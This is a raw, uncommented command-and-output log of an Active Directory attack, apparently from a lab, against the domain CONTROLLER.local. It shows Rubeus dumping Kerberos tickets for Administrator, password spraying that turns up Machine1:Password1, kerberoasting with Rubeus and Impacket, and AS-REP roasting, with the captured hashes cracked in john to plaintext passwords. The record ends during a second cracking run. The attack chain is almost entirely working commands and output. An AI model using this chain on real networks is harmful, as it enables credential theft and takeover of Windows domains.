+    ayB8OlhBAdswIkZ8F6YXqFdD4HBi3JaLG5Mxo6VmB5U3UjMSB5rviBFst6cpyS5hmFBQLHsLz7yS
+GaXJ95pZphWB/OTOEybonTnM
+    0rGQR/pXAXe2ZkAE3GfSN9B7tXEmtY66ap8x6lq1rfbMNt2/BMo9Dn6jgfcwgfSgAwIBAKKB7ASB
+6X2B5jCB46CB4DCB3TCB2qAr
+    MCmgAwIBEqEiBCByfXOGKO022NYYswqB57z+xY4d1OaX9+J342caLGup16ESGxBDT05UUk9MTEVS
+LkxPQ0FMohowGKADAgEBoREw
+    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIxMDMyNTA5NDg1MVqmERgPMjAyMTAzMjUx
+OTQ4NTFapxEYDzIwMjEwNDAx
+    MDk0ODUxWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9M
+TEVSLkxPQ0FM
+
+  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
+  StartTime             :  3/25/2021 2:19:26 AM
+  EndTime               :  3/25/2021 12:19:26 PM
+  RenewTill             :  4/1/2021 2:19:26 AM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded,
+ forwardable
+  Base64EncodedTicket   :
+
+    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9D
+QUyiJTAjoAMCAQKhHDAaGwZr
+    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEhiesTRvPGiE
+3yqd5F68IU5kfvfMLP9lC7mL
+    eu5UCHFwCHDnYo+gICdSjjWCUDyDTPAnbB/7vVIr2n3vQqrhcASiLe+zZRXu7rQAOb2/QotsNKDt
+j16Vami+py6REYcvSMU5uKm5
+    ydZmqeXONkYvMpshtd+cYNNZUTcUfP4NPqw3F4YoaecdK3DOoAHw5bk9cuwRcK5u5ToT+smg1QdA
+2406pZAWSCbtEg2q6FmPUali
+    EoLZi7uHB1Fs5yom+sIhhC71MkK6s1Vn+J1Fgvv1fRABWtDOMCzs7sQK73780asQn1FUPmzuNoFq
+QDzubnXbweYC2G6RE/NH+v9C
+    w/C8PRphOg6BZFc4ReIPn/XEDnZmuCUdzfwbykDbYrFKoH7Q/8CeKnG63Z8YOmRZtwfo/jvBQyyv
+gv5Bq1YfBnn2xHxRwxq4sFXp
+    3ZH+5Pvb1YL6JOqNWkwZHxS4seLMaKBj05TlbnwPFauhJpNCuTeDeTMZbfzI7a1XhuWHOZXj82pv
+z54Zc3ZARsgRJw1xzEWKYId+
+    NEeaDZQAS37TKnYX4zcVFtJEwTmmugH7tDbxRYr3sB6//jEUIYU9tJSJWJUr5bf1+xioRvyGA7lN
+RvCoJm7udCxj7DpFl1TJqZX1
+    9qrGC+Q7wTzyFvFC5isxxxTFnl73iP7OfAPTg5qkuQ3mHR3Wz01ddmygClwDetYJjV9aHrTBG/uU
+zmVI2Ci2pHOpDayKDOQU9ZHp
+    qeBIo7IZAduiaPW4KeHaWwC/rmsFgTPOJpiGE9VScnagyOZ6g7hZokvqVzxbib3oETs9W9r3IQOi
+tGrgwcaA/pe23467uX/fdnFK
+    JUtHLQbOa+jg3e39go582h8pcQNunyIBI/luxR7ZSo6WF99kBtwI6xfXdPttSsgqp+MXnD9ww4ZY
+7FwOXvgzpZIYsYcmM0dVgpDf
+    BTEYlklgOBblse1cbxk8yhsKNdeHRp7n7ueq74LPjomCmGmymCQhpWmmN/NzCRox2M98r1ZgsAAA
+EzNGPUFHmdPhtMQi2//4A9/P
+    +T0LXHc/nCTOzl3Hleg+TLfuH2BReyagmZPTLz+lypAXawWTyGj4LWHYwTfbz6WM73bykhQ9LL+z
+Z3xOEmoSO70rhCsf5RTfUZNV
+    D1GLTg3GPPh5l90fIgDwousaFps1E7ZtJL4z/m+i6ztsAq4ocL10A6U+A4eYvNHqXo3vvkGxBz63
+YutA6C/te1hSvv+ill6mRT6X
+    MecSl8f2yoFcxCTZeWMdjylfX0yoHKw/mCqKEB2Nzo8Cts6AzCGh9Z2ohj//HRzd7MdYxD/1W7xV
++3+62HhTUEZWzWmAHPaqKZvj
+    u9veApl2Hde7kRpuoL+8Bn33GB6p/tqUl+FKqyFfVS2dE/aLlu6w7VSjgfcwgfSgAwIBAKKB7ASB
+6X2B5jCB46CB4DCB3TCB2qAr
+    MCmgAwIBEqEiBCDzN0czMNVcPgj1XpLJBQS7uKZWoR4jVlHsRnScwrI1saESGxBDT05UUk9MTEVS
+LkxPQ0FMohowGKADAgEBoREw
+    DxsNQ09OVFJPTExFUi0xJKMHAwUAYKEAAKURGA8yMDIxMDMyNTA5MTkyNlqmERgPMjAyMTAzMjUx
+OTE5MjZapxEYDzIwMjEwNDAx
+    MDkxOTI2WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9M
+TEVSLkxPQ0FM
+
+  User                  :  Administrator@CONTROLLER.LOCAL
+  StartTime             :  3/25/2021 2:48:23 AM
+  EndTime               :  3/25/2021 12:48:23 PM 
+  RenewTill             :  4/1/2021 2:48:23 AM
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, f
+orwardable
+  Base64EncodedTicket   :
+
+    CmNus0Dtm8sfR85exsSfGK2uZSTr/+mZTLjFK8i5I+hoVJ42DyfcwyU9BaJzwGRb0OVAjVBvFcv5CQ5/x3066gIRtYTqVcKISMcl
+    VJi51SMHz5GQU9qJMpNP762cjUqTi6T3ToNnaMr9dUENdKMseW2QpnEcsG0Px0M8A1RchHh4Trvmh2YqDCcaS3r76U1d2jSl9G+M
+    6MxGa39CxlLGTcICNSGsxPS+UGgcXAl9SrUtIRIbXbPMLBQmVjjfZJ+HYsvDg8agBtt+NRABtKOHNDhc6/40VZsKFP08EJEBJqKD
+    KBWSGbbl1Cw4HAeMvtwX4IafP6MFoOx735p6jdwdT68e52atzLCIqMJDKmM59Vvo0hUCMDOHfrv5SbqYnYEYu38c9FQAa0DMAC70
+    QKPpCCPEVwOiyMSpypjZdcKZFS/rShy8spnodmt5yqdABXBm8qeNhNrujylsnBKgnnMLYUqicA57PTBLBn3JZ3nlO8EfOrBQPASp
+    rCjCLETK7fpgPU04VFJN693L8hovIgPfJzqqHRailvHfl2S6WEIJQ2n/45zwkE2ORaOB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHg
+    MIHdMIHaoCswKaADAgESoSIEIM4cvGypmxLAK+z1/olxC7uSqiI242hIXc1EShw78gHVoRIbEENPTlRST0xMRVIuTE9DQUyiGjAY
+    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjEwMzI1MDk0ODIzWqYRGA8yMDIxMDMyNTE5NDgyM1qnERgP
+    MjAyMTA0MDEwOTQ4MjNaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=
+
+[*] Ticket cache size: 4
+[*] Sleeping until 3/25/2021 2:50:56 AM (30 seconds) for next display
+
+>echo 10.10.255.103 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
+
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[-] Blocked/Disabled user => Guest
+[-] Blocked/Disabled user => krbtgt
+[+] STUPENDOUS => Machine1:Password1
+[*] base64(Machine1.kirbi):
+
+      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
+      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
+      BIID7bGhTxyhaml5ynDTohxFOoLMTvF+MZHu784S1x9015grlTS2FVBwYFZSAhMsNxKmwDi3hQ1RMdfu
+      y902sJP6ZP58tzlQEYfs+ZQQHtTOuKVnOpT2QxjVAw/jkt6lU0SMsdg6h0qqg+RHnkjv7vHQgEn4Z1yF
+      nnsfBtKnskc4Zn92mIS8lEZmsBFA7tC7h3npQIFgCgoQK06pReR1IcNSPCfxTkIU0tnEBwl+ILQ7BJb/
+      ewABEiEwApH5bHLBxjVydv3shSwUu/JkaZrsY4MrVRW1C89zdjgEXi8lNZNqPNqx0Ohq9h/L0W8CUBBG
+      zFlhajugmyMhmaF2x4L/dV13suU8WcgPFOQH2rg2D7k1fl/Yx73jD5teNW8gGKV+TTDtZF9do6jQy6RC
+      ncDcXSS6g2OFdOChJ+l4ugDrcpztKujzxTpOXIvjFGOi62Rk4QSWvmgpRMKaKeRpxdMHATmNgLwuBx63
+      RSAuhpYKDEhvFKXWy+ZCFON0MZ0fOjrqk1O6rbrqV6YG8CjgWiIVTDoSrPXvJ1PFMOWClEyc0byw8C1y
+      oUNkw7laE4+26qnS/1TCSN0Q8wRIfkSMb1Smv5rVg/jveiYoDjsk5kas8TvWKWCdVPziDAtZQxGa4iXA
+      T1NjdEX0tuvuvNsuZ4ftbvAmgV3eTNMz7ZuZJri0AH+1Nusf1kaMOtVeRuY/Kn1zGr1fkM5U/swU2cn3
+      VLSL41NfHQnLOkG6t0i2prB3h4iRH3AcSULC9QiVE42rpLViLPoW40AjjM06uir6IKTkGB7ZsRcXtc1r
+      fIcdy5/a0xOKk/tFl6ODJVfFIE4zI1Aryo53kdP5cyXhPAGwIoVi7qc8NdzQc4HbNpqykVMJv9ASu8s4
+      6bdvw4rQIwl77b9tgnWqnUDSCkJ5YbaA5/xdPEpcMJERSAzjKwgigjv6Kh2xp5/rvRBYrPC/r3giwuHp
+      POVgnQ6flv+6sowlr+a8EHMdM4HfYVxg6V/r298CSZKkmEeG9UrkX0/0b27eMImueC7BV9JwYYqRlh+e
+      wSMoT2VvbTUqk1FZkK+l5DhfhEoojgwfazc57D5OOyak7xydb9XCpwgyQFM83P6p+8JH6ZO29S/e+FC+
+      O1RcZUa459AJaiqfMDbGZJHGp1Xl6ejGW5SGJ5EiOpSBrLqo63CpdyY9bFbD8w6YKzmF53AI1ipU+Po6
+      fx0ZroWdz0djherioEYXU+brqwyihZtrW/OfSyHgXtO9SwK+CiM0viS7OrfYyxgK2E8S57VzYxqMpHwH
+      RQjgAXVV1zt/o6FIbhQANsxtyRwVZa8KGJoyhd+LbRKo29iioLmWgSlS82Kb4VW256OB8jCB76ADAgEA
+      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIHMtVxHG6btXUPfmSC3l9PSUNgwhQWWu/Jrm
+      37ZyPr1LoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
+      GA8yMDIxMDMyNTEwMTgxNVqmERgPMjAyMTAzMjUyMDE4MTVapxEYDzIwMjEwNDAxMTAxODE1WqgSGxBD
+      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs
+
+
+
+[+] Done
+
+>wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt
+>Rubeus.exe kerberoast
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts. 
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. 
+ 
+[*] Searching the current domain for Kerberoastable users 
+
+[*] Total kerberoastable users : 2
+
+
+[*] SamAccountName         : SQLService
+[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local 
+[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
+[*] PwdLastSet             : 5/25/2020 10:28:26 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
+                             l:30111*$45D7B9091C7B7248F181641A773F606B$CA0E24796B728874D174826AE5BB8C04C7436F 
+                             51766AA4FFF2A08935872B244A64DA8FF6CC384CBE9FAC9D26BF40914D32651250EA12E173E4A588      
+                             E942B87A8AC9C11C803B41B8C0402E48F920C4A9DD1E638AD0453FAE1F180B65BA62043BE8152052      
+                             576FD3D3911D84A91BEB6D9E8301F4C1AC60EF6F77846E2C4E0E392888E088EE33B6167FACECB9FD      
+                             D46639CD39D3D7B82BBF44D0000C5D190CFE00CB9F0491549A035F1FFAFAFAAAB6910E60FE6B75F1      
+                             C3950B1466165C05858E50556E39B297CFE21252EFB21F21FDE680E652980E738012A13BF298F7E0      
+                             F1F506B4ADCB63E26891AEDF8C1A7EF9F00EC99D90DCC687BFA2716872E4A22222ECE663D0A15509      
+                             EC7D6BF65E4293A0C6361CE25D65728F8BA8817975CCB914F0685AF34D90A613A2D39B3213FAFA63      
+                             59B3E4AE986F4175EF38983B192017EC3984EA3D3706E8FE6866586B85C258D1C50094ED37781243      
+                             AEFFC515A44C4228FA4D15659AF52D7A55AA5572A81971D901859EFDF3B747006384D8803396F853      
+                             084B3CD73B689E8F3CD01BF492C61A2CF4FC6A7504C89B5976EBEC8E00527766C466EBFA4468201A      
+                             F08D204DBBFD6BFC288873D0BF3B98B3E8D174BD8BFE1F3EF833A0D45F0EE229B5FE103C9FC14160      
+                             1A6348463E3936D19CA0E131B70C4ACD82E3013F7B9F70BE0E8B3148B194E09D4CE3194A9B68952B      
+                             955A3FDAA2390F00112B1203F05485EA589F5E9909CA6251D4ABF7B7E9683EC3EADDD8D1ECEBF053      
+                             E3F391B0530BC397BBCF35C510E1D3F4AF16B34C1E3DC559F41A6F6998A4D80BB6F742A6D0983556      
+                             87778EC9FC944E341DE287072D6E3761923FC78664B952238B2A1400E4DF00F74CEC83374CD98557      
+                             B790E8782321722AB1C15C689177DDF1844620489DE506A15E7E2FE79AF0D2CAF5E6EF4436844A9C      
+                             A72294AC9A52118A683A26A9AC9569915EF0CC4E0A8165DAB1446FFBDC41AF08BCAAC4D87969BAF1      
+                             527537546F92E153DAFED6868360A9303E48B4EBA3C9C64E2662566E47A3D06BC94F474F92EB9A42      
+                             AC3AC07D06168256DF4972A6FE8A41638C6DCE96C04CE92690A32814B45D9B8F72FDEC8D35349890      
+                             16EC1100063F95A910F6F7890F0FE18A01783B2A64265A9419D833463094F0B9B1AAC75113C87D16      
+                             5B4D459FB61CB9CA0773823BF6B5F7FC83C209ED59D92B8CDD38F46274ABD9D90BBDFCC7C74835D0      
+                             0DCF643BBFC8E59E812A7C8F9E24972288DB0020B718CE76B65D017B1D2A7846E3BFEC0B52D28BF4      
+                             239197608360BA9DF32CB4400FC4F6C1879F4B081319E5021DB1F258B22AF4A1CCED89E73DAF6A01      
+                             3036F23AB94D6474E0E3700908E852EE0335870419C67C2DCD9481459C23B236DCA67B1705176CA9      
+                             A20D028951D91EEFC20F12CA9A867CD47CFBFFA812C607D04977BF187CAAE3242D597225E2758253      
+                             86199617D1420EFE97758CCEDE6DB2760C59FEFD9C1DC23DA2FB3C2C059B729EE678F6735408FD49      
+                             FEBA4E911D0014C04C6CC9B44ACB6CB2AF09622C28F4548E7058FF7DEE812747F613A765841FA71F      
+                             280F8373C5A733E0B0F2AA928C39F2395FDA51BF70E3DC1490E075100D986546DB63AA90F0C8F024      
+                             959BF574261184A0DE074947B2624E20C76D5772BD394F0B26715A1C81
+
+
+[*] SamAccountName         : HTTPService
+[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
+[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
+[*] PwdLastSet             : 5/25/2020 10:39:17 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo      
+                             cal:30222*$BE37ED3975795C2AAA8DC89BB12CE0DD$3CA4F4B787D577A6C4D6A433BB64656F3898      
+                             8FA26436E1B852260B2095242694996094283E9D8DD2F2C4A8B71260118DC3842D59111A4A414358      
+                             01551D10A76974FC9143F21F0ADA5072ADB825F88DA7509429AF895BC937839087FC7BE103DA7859      
+                             077CFA035C544D2315C7B835745F8B2CDC94230CA91CC36F25557C3CF8E3240CFB384CC605FFCE3B      
+                             A0FDB7B520BCA8431B78BC50C64A417292494977D7032B9554BA988AED4437A886455B1295F51601      
+                             B7F44145A528E7EB7BF8D95AA0A9FBDAFAF10C7FDB99846150773A62B6DDA475A56DAA1ADF7252FA      
+                             7D3BCE383D11DF86BD63BDBEB7ACD879C24C7142F1F58F77E7D09DFA694640B1D9E976826926731F      
+                             0E2F4AE2DB7BF9365EBC63795AA19BEFD908A273ED9444C96D12E6A7CBCB81B78884EA27FA62619B      
+                             5F6AF92B4A6B58DC47F62BD1CBB966952A1E7E6E3FF7B758F86210ED14B8C7B4369B36F0C66BD5D2      
+                             1BBB7980699D79D43EDA25AF3209A3A481BFE0850E92E0FE1E482936B9AA16A7D3F10CB7839AB156      
+                             03B1183E0CBB0876BEF69575FF9692434F4E172426C5908D51164B8F1FDE077D6F7A1C65C039AB73      
+                             19BC3D71CC2E8854AF9414E7A3396419F63349DD703F1C67D72F107323DC87506FFD6D0F0C8B2128      
+                             57E625833D96B4CD231A2AB1D820725E09D8D75149E063027CC57936B7C58254E64F566A8AF1BF4D      
+                             E1C4502A9C0591B8240522B008432B0798443AF234A976F401C0365AB691FBEFFA86CA6DE110682D      
+                             BEC8209AA9EBE9512F15E3256D565AC5C300DB35159B74E66ACCEA537C08361F324BD53FB0BB0BB9      
+                             21DB2CC20188C7CC9EB755094FC249587214FF24B81D7762CDD18EC45EBA022B84BB0A1AAACBFDEE      
+                             92588AFDD0C3E3B2F4F16963AECCAEE749DB4D45DF0810872121E0C9121910D0525F24BFE01EB42C      
+                             23B1C190063A1F8FFF80156F8E6354CB5694AA868B6FBC392AE70B4241A5EDC771C8E2FE93F1A120      
+                             18D0BB51AE64279E19738D59EB15297E7FCE643B9835DB757BBAC0F8A55A1E2DFB9114D8647C74C4      
+                             4294098188EC9E8BCE692625F971CB615CA5E6F8F686D4317B7E1BA978364BDFA07457D73699F62E      
+                             003EA3F4D0EE9111F26D43713922A18B3D1C737B49A6E65D712EDA46D1C3A5761E7B803481EF88F7      
+                             285044134E7253EE77FC704E43E4D6358E0B43B4FF97840B648E493EED751849B7D31FF2276171BC      
+                             3D7EC7F384BC1EA4E9ED0BF788532DE0960A507B3E643B0A345499AE0D3FB319A645ECCC93DB8C7D      
+                             F6275FA87D4668BB7A5B59708E1CD9989B3188615A973B7EB647C3350452D717C1BF4E75148DF3FE      
+                             29631932083F51F1719DBB54E1E84D6A842EE7EB76196551606F2831E43A54A2D3A030B0FC63E6FB      
+                             BAA785E496FF5F4D1E3B235F5B2E882426B30A96B29BEE9475C90CF01CDE39963CEA83144FC900A1      
+                             17469C41F934BDCD438CD5E468B56900191BB85EC16B089AA8A0FE4935105D78D2B2971C5031838B      
+                             62044419C97F0D01BE017F2E5680B7882CC31EE82E9227E80EB085BEB19451755E1141640CAD8679      
+                             EB0F507DF3AD030D957178788CAE2CD79313278476FF447E65D26E0D96B09C1A513FBC57BF3E7C43      
+                             20DAEB318F15D96208C5FD2CC9B457BACA0E34264E9228A9E141B051F584
+
+
+>python3 /usr/local/bin/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.244.16 -request
+
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+ServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation 
+-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------
+CONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=local  2020-05-25 23:28:26.922527  2020-05-25 23:46:42.467441             
+CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-25 23:39:17.578393  2020-05-25 23:40:14.671872             
+
+
+
+$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$CONTROLLER-1/SQLService.CONTROLLER.local~30111*$9ef7009ab594b35855975bd136a30b34$2792e3a1d133be6ef36ca2bd9dd339c1377d0ed91d127de8b7a8c7e05a8b009f971ca0fe66616b0e6794cca920a360ddbe6a3c620160e4ac264b054969c2d32a3b0eafa13b2ff4670e861a62cb4a4cfc8e264ce6a404210b3164a00dd7455a75d551be8c53130c7365527d90444bf402662605492f3a4ca11935800e18ce3a91d496a240f129d90e660d36d414ca770f5b5cb89f12df1945cd026ae6dc5cb1541f2f6aa124a479805fe9bedfbf1c302c1a9860fbc1aa7f7877f7a814f5a6db680038b0d049765d8cd82381e6c5a1c62f48cb01948e4dedf9afa14a614fd430bb1a4c4cbe00a4d3c5adf7aed13c4c735dfa3fa47362780c4f8746ac33e30adfa888f7a28f6248ae0a02f0a56ed305d9c46a48226f5e857027106c50cfb9f5a1cbbb9be0be86a73d01aea7e2699e290b1fcf018e58c8b986b521d228ccdfe66d2f2ad2fabf030052f6da0010abc2f14a22be035c265c8955c41dce80a813ad49c78781435182cbf7fa34792f69a48053acf583b091a33dffeb989490aadf314fde6c3e8134be428ba435ebc93f24a6a3439f39350d1a6482c0916a3275790414aaa15872f59e43e5b29a6611d31743c7b0f51b73e204ca25fac61ff71bd067b54898d94b63a06c687babc616e1397564a99cdf1208f01df569bd44b0e7721e16b8f17d5a48677049439a0ab069394d44939dff07a7fda387c7c0962fd1add2e3e32d6adeabfb4c2168a5448cc2b0b242600f87c301053123f1d621227376c52324480e4cb11abe3d5d3189d8522b984600a8f6bbad74ed7695749c17f10c9a821f65a64b1ea47e667f803d7016ea6c09f7f46629fdf497ba12acff3456821859a4343eec27d841dac1ece6facdc42338e21e793e212a326ed7d00504ce5d972c9d300f4cb2d822b850a1d0571538cc7f70025ef3b7bf6d3bbd912bd94a8b81afe6ae7714fe586452e859ea5f7429b878eda4348f1dcb08e8c035c37169c8639a746c3a02ef7fabd0e06000eedda212eec285746382fef3ba7eb69a06f889b3c171b55cd44195cdb1a4e6f5e2545d9333d1320e355af151676ac46ce8998af7d4ddb28e71497cb0deedd325f59beaa70f6290c56978305f0744b11cfe490d8fe18de6e01e9e7d575bcf1b274cc803d521e9909e554bfa3a75080caa7e04fd7e2898a37b42848489664a39fae3244a018c04d4f1a33b0aad419441f229facb617d44e79b9ea4da2f53a9ebdd109389b14d168c639958e3c17520dc813c9c866550caae54a2d1273b9919dfe10b1621017a0bd3f1f8f871547c9271a76876ea6a1e51463a14ff477782897fcaec3645bc80e63fcf8fb430e1f790b76d18f6a8e78b41955d715bb50449d5f3de5001e8747b8125
+$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$CONTROLLER-1/HTTPService.CONTROLLER.local~30222*$5fcd77a0888d75ed65a7f59bf8f12abb$f04b399e81c26e1bcd0530b3c96269e54cded213608f977d7a5206e031f2f9c3c087a3a79643d68bc80f3e6686e2d2caa4a5bb89d4fe4adda885b3f188f694adacc48309ee718af1813168f3547069f207d078920a5e00de0051c319744d74f84a9ed51b2c662da4b4716f3b63bfd179528c9763fa88233968a9d87fb672c55169f2c4c1170bbbba902626ba7373f489f8d8955e94e9b733060f8c02bf070ba6fea1b4a7c2e38851c1e380e254ef861fc6d03c562ff632d03b8f615593474da5e7e927ea675ffc606fb441bc97439c036c413f356511d3ad1c309a68a91eb7bc5c4cdc36b492904954603536be71990ac67436b537788fb0797d8dde9a64c6bdc5fac328ea8d7f1406da1de683683d33a568b4eb3bf6c686164bfb5989237d3d4e15bbe1e8c99fc597ef39c70be262279381b309619bcad01dd7f485551b3010f04a2925bc38c6661b90e26c5f8936d1dd607f3d33c6072f780d11ee1497f043b24ddf74bb29825ed839f8a896707189be9883e36504b05b05ecfa4fdf625de2e312bb292b16723014c95b5de9ae75e4dd88475d79ba3fcf48d2d8aab30bc2e2195f3bd19836b0a7a8a576f5e054789bc60cbd60610928b794a9c0c2ddc50b13b04feef96d2cd9ccd76951f8deaba7ad996948775b2e621fda47f589191c8a5a84d3a4e237a0a5e79e4f6799199597010d6ca954dbd4f4f14890c26802a6cc38893af6742b6eb9e0fe00f76de2a4b0753ae8a6290a60bb883ef10d2760b118c76096ee8292bc31d64b97a9c4465a682709585731cf6874f040b14f034cdb597ca5fff9bf40d7545ce74c99270713b40ef26181da9624841181285dee4c9ea95e45d1a9cb0700e9e4e6de51cf530e59472f7f03088d5f14c2b1ce2bbe325fe74f43627580cbf79b4489df8af570d165959076918e43c55133d963eca1d33f901e29a34e21b9432bca0e9f22761b2934ace975550baeef2f9a337b9e862e52658139d881e12a1de2bf7808581478c60eeb44ba1753ec1cb028eb94a7a3507c47facec9af1b866b657a2cd3eefdb907ffca777dd72fbee69dc21ee754cc94767ee9bfffbcc5d7d91d75e608e7f955a9b4606936854f439eedf50706d3193d73ce4832ef4b6920b27103c19d5ac0ccc97af653597512ddb09631e5f91bf4c28042bbbad6889460e9f4ef3839629b8cf420efc7d73a54fd3ea932358bd8c84c24be188135bf093ffbe3e15778903d437e55e63c4ff1e02a518eacd17e9d04ac6f334ce562532ff87b790c9424f10dc4c614f66e37b21859de0fa3ebf212c3d6f594146dd38f977db0e88daf38fba42467d650eff335fc959994ee5df5b905df9803b08b1a4c7a66916686aa6a94005b7bf64348
+
+>john hash.txt --wordlist=./Pass.txt
+
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Summer2020       (?)
+MYPassword123#   (?)
+2g 0:00:00:00 DONE (2021-03-25 11:00) 66.66g/s 41333p/s 75466c/s 75466C/s paulina..hello123
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+>Rubeus.exe asreproast
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+
+[*] Action: AS-REP roasting
+
+[*] Target Domain          : CONTROLLER.local
+
+[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users        
+[*] SamAccountName         : Admin2
+[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
+[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::cd77:15e5:4efe:d791%5)
+[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$Admin2@CONTROLLER.local:AB81C493423D3C76059CC828E2D02948$CD5D0F0882BE
+      2554E8327D7C9C84984E9333E5368A6C607612476BBFD8DD076A44748239157626A5B093E4CF9B75
+      0B02B5CA9B811768AA4D72DE65D471464EF7447841BB1B125DE6A839AD528533669B89ED45426090
+      054EE8D075A89859C245E937A112C7A533D21FD8CF76C755C89088987D8600D3803E408D27F83F27
+      599726A2B31332139353E208D1DD0E900448E6E44351D2AA0C4E86D89952D3FA0AF4155C568895B4
+      C39B639429117C481DF207EB5D945B6BEE8FC06872DB3A2782B73BD017516B3A07DACD7CA9044B08
+      1073B5A50A8E6C90AA58D9B96A00C086082141E731B6C0D62B9E55BEE59715CB25A901BEA24C
+
+[*] SamAccountName         : User3
+[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
+[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::cd77:15e5:4efe:d791%5)
+[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$User3@CONTROLLER.local:AD29C1121AA86EC9054E765E70B05915$2C3AFD4D68383
+      76C8295E4CCE854CA4F89D0E7897C7D05AF77AE3099FEF18F59B1151C4F703A8420417ED028AAC3D
+      E7D228D536DC9077D0E3469DF6E1EE3F6194DBE3D967902E51681398B4CF49CEDE646FF7170082DD
+      28C6066669206912D3AFA86EDF97F6D055EAC427DBF6DBCCECE7E7A14486291FAD650344F3F12136
+      DD52C1C98F15B234450FAF98EFC0F73F5E12366602F3F4358E688D52E55B91520AE37F370D0C52A6
+      C15CC8E65C099C708AF1788BD573621B5F6379E7F1E3D1F857487B11BE9AD43A44FEAF06DAA46BC7
+      DD7245001D21C9E7F844BDC31D5B8E8C6600BDED6F1EDD326846144A2C99D58EB55E2716514
+
+>john hash2 --wordlist=./Pass.txt
+
+Warning: detected hash type "krb5asrep", but the string is also recognized as "krb5asrep-aes-opencl"
+Use the "--format=krb5asrep-aes-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
